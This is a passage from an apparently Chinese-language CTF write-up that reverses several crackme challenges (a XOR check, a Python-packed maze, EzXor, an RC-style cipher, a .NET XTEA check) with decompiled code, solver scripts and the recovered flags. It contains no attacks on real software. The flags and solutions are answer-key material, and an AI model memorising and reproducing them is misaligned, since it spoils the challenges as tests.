  v13<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">222</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">17</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">63</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">26</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">38</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">104</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">63</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">27</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">47</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">24</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">233</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">233</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">172</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">29</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>len_add1 <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    v4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>len_add1 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v12 <span class="token operator">=</span> v4 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>                               <span class="token comment">// len+1</span>
    v5 <span class="token operator">=</span> <span class="token number">1LL</span><span class="token punctuation">;</span>
    <span class="token keyword">do</span>
    <span class="token punctuation">{</span>
      v7 <span class="token operator">=</span> input<span class="token punctuation">[</span>v5 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0x77</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_401D25</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span> <span class="token punctuation">)</span>
        v6 <span class="token operator">=</span> <span class="token punctuation">(</span>v7 <span class="token operator">+</span> <span class="token number">55</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x21</span><span class="token punctuation">;</span>
      <span class="token keyword">else</span>
        v6 <span class="token operator">=</span> <span class="token punctuation">(</span>v7 <span class="token operator">+</span> <span class="token number">77</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x4A</span><span class="token punctuation">;</span>
      v11<span class="token punctuation">[</span>v5<span class="token operator">++</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v6<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span> v5 <span class="token operator">!=</span> v12 <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> v11<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> v13<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">sub_4101F0</span><span class="token punctuation">(</span><span class="token number">1LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">==</span> v4 <span class="token punctuation">)</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"win!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enjoy your first reverse tour!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">!=</span> v14 <span class="token punctuation">)</span>
    <span class="token function">sub_4547E0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>感觉上面有很多奇怪的代码部分，不过好像不影响下面做题，看了代码后会发现sub_4101F0其大致内容如下：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221027235619204.png" alt="image-20221027235619204"></p>
<p>复制ida分析出的源代码改了一下就可以得到flag：</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include&lt;iostream&gt;
using namespace std;

int sub_401D25(int a1)
{
  bool v1; // esi
  int v2; // ecx

  v1 = (a1 != 1);
  if ( a1 &gt; 2 )
  {
    if ( (a1 &amp; 1) != 0 )                        // a1是基数
    {
      v2 = 2;
      while ( a1 != ++v2 )
      {
        if ( !(a1 % v2) )                       // a1是v2的倍数
          return 0;
      }
    }
    else
    {
      v1 = 0;
    }
  }
  return v1;
}
int v13[38]={0};
int v6;
int v11[38];
int main(){
  v13[0] = 59;
  v13[1] = 68;
  v13[2] = 74;
  v13[3] = 19;
  v13[4] = 118;
  v13[5] = 219;
  v13[6] = 83;
  v13[7] = 43;
  v13[8] = 47;
  v13[9] = 45;
  v13[10] = 104;
  v13[11] = 63;
  v13[12] = 27;
  v13[13] = 222;
  v13[14] = 63;
  v13[15] = 23;
  v13[16] = 72;
  v13[17] = 53;
  v13[18] = 114;
  v13[19] = 63;
  v13[20] = 219;
  v13[21] = 204;
  v13[22] = 117;
  v13[23] = 222;
  v13[24] = 17;
  v13[25] = 63;
  v13[26] = 26;
  v13[27] = 38;
  v13[28] = 104;
  v13[29] = 63;
  v13[30] = 27;
  v13[31] = 47;
  v13[32] = 5;
  v13[33] = 24;
  v13[34] = 233;
  v13[35] = 233;
  v13[36] = 172;
  v13[37] = 29;
    for(int i=0; i&lt;=37;i++){
        if(sub_401D25(i+1)){
          v6=(v13[i]^0x21)-55;
        }
        else{
          v6=(v13[i]^0x4A)-77;
        }
        v6^=0x77;
        v11[i]=v6;
    }
    for(int i=0;i&lt;=37;i++){
      cout&lt;&lt;char(v11[i]);
    }

    return 0;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>flag：SYC{W3Lcome_t0_gEEk_3Nj0y_the_tour!!!}</strong></p>
<h3 id="pick-apple"><a href="#pick-apple" class="headerlink" title="pick apple"></a>pick apple</h3><p>看这个题的字符串发现了很多python的函数名，由此可以猜测本题的exe文件是由python写出来的</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221121232000425.png" alt="image-20221121232000425"></p>
<p>于是我们用工具将exe文件转为py，这里参考<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_49764009/article/details/120340153">这篇文章<i class="fas fa-external-link-alt"></i></a></p>
<p>转换完后为如下代码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">crack <span class="token operator">=</span> <span class="token string">'##########################0#0000000#0#0#000000000##0#######0#0#0#0#0#0###0##00000#000#00000#0#000#0######0###0#0##############0#0#0#0#0#000#0#000#000##0#0#S#0#0#0###0#0###0####000#00000#0#000#000#0#0####0#####0#0#0###0###0#0##0#00000#000#0#0#0#000#0##0#####0#0###0#0#0#0###0##0#000#000#0#0#0#0000000##0###0###0#0#0#0#0#0######0#000000000000000#00000##0#0#######0#####0###0####000#00000000000#000#000######0#####0#########0#0##00000#0000000000000#0#0##0###0#0#0###0###0#####0##000#0#0#0#00000#0#000#0##0#0#0#####0#0#####0######0#0#0#00000#00000000000##0#0#####0#0#0#0#0#####0##0#0#00000#0#0#0#00000#E##########################'</span>

<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> list1<span class="token punctuation">)</span><span class="token punctuation">:</span>
    l <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    flag <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> l<span class="token punctuation">:</span>         <span class="token comment">#长度为36,且由l来控制下表</span>
        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">'$'</span> <span class="token keyword">and</span> list1<span class="token punctuation">[</span>s <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'0'</span><span class="token punctuation">:</span>	<span class="token comment"># 向右走</span>
            s <span class="token operator">+=</span> <span class="token number">1</span>
            <span class="token keyword">continue</span>
        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">'*'</span> <span class="token keyword">and</span> list1<span class="token punctuation">[</span>s <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'0'</span><span class="token punctuation">:</span>	<span class="token comment"># 向左走</span>
            s <span class="token operator">-=</span> <span class="token number">1</span>
            <span class="token keyword">continue</span>
        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">'&amp;'</span> <span class="token keyword">and</span> list1<span class="token punctuation">[</span>s <span class="token operator">+</span> <span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'0'</span><span class="token punctuation">:</span>	<span class="token comment"># 向下走检查是否到E</span>
            s <span class="token operator">+=</span> <span class="token number">25</span>
            <span class="token keyword">continue</span>
        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">'%'</span> <span class="token keyword">and</span> list1<span class="token punctuation">[</span>s <span class="token operator">-</span> <span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'0'</span><span class="token punctuation">:</span>	<span class="token comment"># 向上走</span>
            s <span class="token operator">-=</span> <span class="token number">25</span>
            <span class="token keyword">continue</span>
        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">'&amp;'</span> <span class="token keyword">and</span> list1<span class="token punctuation">[</span>s <span class="token operator">+</span> <span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'E'</span><span class="token punctuation">:</span>	<span class="token comment"># 检查是否到E(终点)</span>
            flag <span class="token operator">=</span> <span class="token number">1</span>
            <span class="token keyword">continue</span>
        flag <span class="token operator">=</span> <span class="token number">2</span>
    <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'oh wrong'</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> <span class="token builtin">len</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">35</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'wrong format'</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'you solved, flag is SYC{your input}'</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'wrong format'</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    crack_list <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>crack<span class="token punctuation">)</span>
    s <span class="token operator">=</span> crack_list<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'S'</span><span class="token punctuation">)</span> <span class="token comment">#记录S的位置</span>
    run<span class="token punctuation">(</span>s<span class="token punctuation">,</span> crack_list<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过以上代码可以看出这道题是个迷宫，通过一下脚本将它打印出来：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">s<span class="token operator">=</span><span class="token string">'##########################0#0000000#0#0#000000000##0#######0#0#0#0#0#0###0##00000#000#00000#0#000#0######0###0#0##############0#0#0#0#0#000#0#000#000##0#0#S#0#0#0###0#0###0####000#00000#0#000#000#0#0####0#####0#0#0###0###0#0##0#00000#000#0#0#0#000#0##0#####0#0###0#0#0#0###0##0#000#000#0#0#0#0000000##0###0###0#0#0#0#0#0######0#000000000000000#00000##0#0#######0#####0###0####000#00000000000#000#000######0#####0#########0#0##00000#0000000000000#0#0##0###0#0#0###0###0#####0##000#0#0#0#00000#0#000#0##0#0#0#####0#0#####0######0#0#0#00000#00000000000##0#0#####0#0#0#0#0#####0##0#0#00000#0#0#0#00000#E##########################'</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">%</span><span class="token number">25</span><span class="token operator">==</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>





<p>有个如下的图：</p>
<pre class="line-numbers language-none"><code class="language-none">#########################

#0#0000000#0#0#000000000#

#0#######0#0#0#0#0#0###0#

#00000#000#00000#0#000#0#

#####0###0#0#############

#0#0#0#0#0#000#0#000#000#

#0#0#S#0#0#0###0#0###0###

#000#00000#0#000#000#0#0#

###0#####0#0#0###0###0#0#

#0#00000#000#0#0#0#000#0#

#0#####0#0###0#0#0#0###0#

#0#000#000#0#0#0#0000000#

#0###0###0#0#0#0#0#0#####

#0#000000000000000#00000#

#0#0#######0#####0###0###

#000#00000000000#000#000#

#####0#####0#########0#0#

#00000#0000000000000#0#0#

#0###0#0#0###0###0#####0#

#000#0#0#0#00000#0#000#0#

#0#0#0#####0#0#####0#####

#0#0#0#00000#00000000000#

#0#0#####0#0#0#0#0#####0#

#0#0#00000#0#0#0#00000#E#

#########################<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>由上面的python脚本可知</p>
<p>$向右走</p>
<p>*向左走</p>
<p>%向上走</p>
<p>&amp;向下走并做检查是否到E</p>
<p>==且以上都只能走到0上==</p>
<p>s所以</p>
<p>按照</p>
<pre class="line-numbers language-none"><code class="language-none">&amp;$$$$&amp;&amp;&amp;&amp;&amp;&amp;$$&amp;&amp;&amp;&amp;$$&amp;&amp;&amp;&amp;$$$$$$$$$$&amp;&amp;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>就可以走到终点</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221109165437539.png" alt="image-20221109165435026"></p>
<p><strong>flag：SYC{&amp;$$$$&amp;&amp;&amp;&amp;&amp;&amp;$$&amp;&amp;&amp;&amp;$$&amp;&amp;&amp;&amp;$$$$$$$$$$&amp;&amp;}</strong></p>
<h3 id="EzXor"><a href="#EzXor" class="headerlink" title="EzXor"></a>EzXor</h3><p>查壳：<img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122131938634.png" alt="image-20221122131938634"></p>
<p>拖入ida中：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122132011293.png" alt="image-20221122132011293"></p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122132023131.png" alt="image-20221122132023131"></p>
<p>分析代码：</p>
<p>首先是检查是否是SYC{data}这种类型的，然后再将其中的data存在v11数组中，并进行异或，52行到59是取v11的长度，最后比较v11中的元素是否等于v9对应下标的元素</p>
<p>解题思路：</p>
<p>逻辑很简单，直接对于v9的值进行异或v8再转char即可，其中v8经过了一个函数的变化,提取转化后的值即可</p>
<p>进行动态调试，再第二个断点处获取存储后的v9</p>
<pre class="line-numbers language-none"><code class="language-none">0x07, 0x42, 0x48, 0x5F, 0x12, 0x48, 0x57, 0x1B, 0x53, 0x57, 0x03, 0x45, 0x4F, 0x69, 0x52, 0x53, 0x0E, 0x40, 0x51, 0x1B, 0x44, 0x5F, 0x0F, 0x5E, 0x42<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>运行脚本</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122185014829.png" alt="image-20221122185014829"></p>
<p><strong>FLAG：SYC{1t<del>i$</del>a-ea5sy_de8vg-ri9ht}</strong></p>
<h3 id="CrazyThursday"><a href="#CrazyThursday" class="headerlink" title="CrazyThursday"></a>CrazyThursday</h3><p>查壳：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122161514008.png" alt="image-20221122161514008"></p>
<p>分析程序：</p>
<p>可知是对一个长度为24的值进行加密后在比较，（24=输入长度29-5（5为”SYC{}“）</p>
<p>程序分析如下：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221117020546067.png" alt="image-20221117020546067"></p>
<p>这里sub_7FF6A43A22E0函数是关键：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122161412454.png" alt="image-20221122161412454"></p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221117020712216.png" alt="image-20221117020712216"></p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221117020753932.png" alt="image-20221117020753932"></p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221117020823256.png" alt="image-20221117020823256"></p>
<p>这个题静态分析了一大半，后面动态分析结束，这个加密函数是对称的，用[LazyIDApandaos版](<a class="link" target="_blank" rel="noopener" href="https://github.com/P4nda0s/LazyIDA">GitHub - P4nda0s/LazyIDA: Make your IDA Lazy!<i class="fas fa-external-link-alt"></i></a>)( <a class="link" target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1WQ4y1X7TY/?spm_id_from=333.999.0.0&amp;vd_source=ef1c6b8dec2e0db6d9153ec87ef3b0b3">使用教程<i class="fas fa-external-link-alt"></i></a> )可以直接修改内存中的值进行修改</p>
<p>根据对比的byte_7FF6A43C5738的数据</p>
<pre class="line-numbers language-none"><code class="language-none">0xE7, 0x5F, 0xC6, 0xE9, 0xD9, 0xE5, 0xD6, 0x11, 0x5A, 0x85, 
  0xF3, 0x49, 0x34, 0xE3, 0x27, 0xDA, 0xC8, 0xD9, 0xBC, 0xE1, 
  0x53, 0xA5, 0xF0, 0xD5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>进行机密程序运算后得到”wwww@RC_RC_RC_RC@wwww:)H“</p>
<p><strong>flag：”SYC{wwww@RC_RC_RC_RC@wwww:)H}”</strong></p>
<h3 id="ForGirls"><a href="#ForGirls" class="headerlink" title="ForGirls"></a>ForGirls</h3><h4 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h4><p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122000230247.png" alt="image-20221122000230247"></p>
<p>通过这两个查壳程序给的信息，可知程序用了.NET框架</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122000754255.png" alt="image-20221122000754255"></p>
<p>这里用了[dnSPY](<a class="link" target="_blank" rel="noopener" href="https://github.com/dnSpy/dnSpy/releases">Releases · dnSpy/dnSpy (github.com)<i class="fas fa-external-link-alt"></i></a>)进行反编译.NET</p>
<h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><p>进行反编译并找到主要的代码：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122001315044.png" alt="image-20221122001315044"></p>
<pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace FG
{
	// Token: 0x02000005 RID: 5
	public class Girls
	{
		// Token: 0x0600000D RID: 13 RVA: 0x00002688 File Offset: 0x00000888
		public void GuessGirlHeart(string str)			//str存储输入的字符串
		{
			List&lt;uint&gt; list = new List&lt;uint&gt;();
			if (str.Length == 20)				//输入长度为20
			{
				for (int i = 0; i &lt; 4; i++)
				{
					if ((uint)str[str.Length - 1 - i] != Girls.LuckyNum[3 - i])	//输入字符后四位与Girls.LuckyNum中的进行比较
                  																//可以根据代码下面Girls.LuckyNum的值可知为LnGs
					{
						Ends.BadEnding();
					}
				}
				byte[] bytes = Encoding.ASCII.GetBytes(str);		//通过ascii码将数据转为byte类型并存储再bytes数组里面
				for (int j = 0; j &lt; 16; j += 4)
				{
					list.Add(Convert.ToUInt32((int)bytes[j] | ((int)bytes[j + 1] &lt;&lt; 8) | ((int)bytes[j + 2] &lt;&lt; 16) | ((int)bytes[j + 3] &lt;&lt; 24)));		//这里将剩余的16个字符4个为一组进行逆序存储如bytes中的abcd存储到list中即为dcba
				}
				if (!this.Guess(list, Girls.LuckyNum, Girls.GirlsHeart) || !this.Guess(list.Skip(2).Take(2).ToList&lt;uint&gt;(), Girls.LuckyNum, Girls.GirlsHeart.Skip(2).Take(2).ToList&lt;uint&gt;()))	//将转换后的四个数据2个为一组放入guess函数中进行加密及判断
				{
					Ends.BadEnding();			//由此可知两次调用函数的返回值需要为非0，否则为BADENDING
					return;
				}
				Ends.HappyEnding();				//达成happyending成就
				return;
			}
			else
			{
				if (str.Length == 0)
				{
					Ends.TureEnding();			//达成TrueEnding成就
					return;
				}
				Ends.BadEnding();
				return;
			}
		}

		// Token: 0x0600000E RID: 14 RVA: 0x00002780 File Offset: 0x00000980
		private bool Guess(List&lt;uint&gt; v, List&lt;uint&gt; k, List&lt;uint&gt; girls)	//XTEA加密
		{
			uint num = v[0];
			uint num2 = v[1];
			uint num3 = 0U;
			uint num4 = 2654435769U;
			for (int i = 0; i &lt; 32; i++)
			{
				num += (((num2 &lt;&lt; 4) ^ (num2 &gt;&gt; 5)) + num2) ^ (num3 + Girls.LuckyNum[Convert.ToInt32(num3 &amp; 3U)]);
				num3 += num4;
				num2 += (((num &lt;&lt; 4) ^ (num &gt;&gt; 5)) + num) ^ (num3 + Girls.LuckyNum[Convert.ToInt32((num3 &gt;&gt; 11) &amp; 3U)]);
			}
			v[0] = num;
			v[1] = num2;
			for (int i = 0; i &lt; 2; i++)			//进行加密
			{
				if (v[i] != girls[i])
				{
					return false;
				}
			}
			return true;
		}

		// Token: 0x0400000C RID: 12
		public static List&lt;uint&gt; LuckyNum = new List&lt;uint&gt; { 76U, 110U, 71U, 115U };

		// Token: 0x0400000D RID: 13
		public static List&lt;uint&gt; GirlsHeart = new List&lt;uint&gt; { 1536903838U, 521453914U, 3046417386U, 1214738056U };
	}
}
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>因此本题的逆向思路如下：</p>
<p>==通过下断点进行动态调试提取出guess中的girls的数据（为什么不用代码中的数据，这个后面会说），然后进行XTEA的解密，将解密后的数据转成字符，4个为一组进行逆序变换==  完成如上过程就可以得到前16位字符。</p>
<p>使用如下逆向脚本进行解密（根据网上找的一个XTEA脚本改的）：</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;stdio.h&gt;  
#include &lt;stdint.h&gt;  
  
void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) {  
    unsigned int i;  
    uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*num_rounds;  
    for (i=0; i &lt; num_rounds; i++) {  
        v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]);  
        sum -= delta;  
        v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]);  
    }  
    v[0]=v0; v[1]=v1;  
}  

int main()  
{  
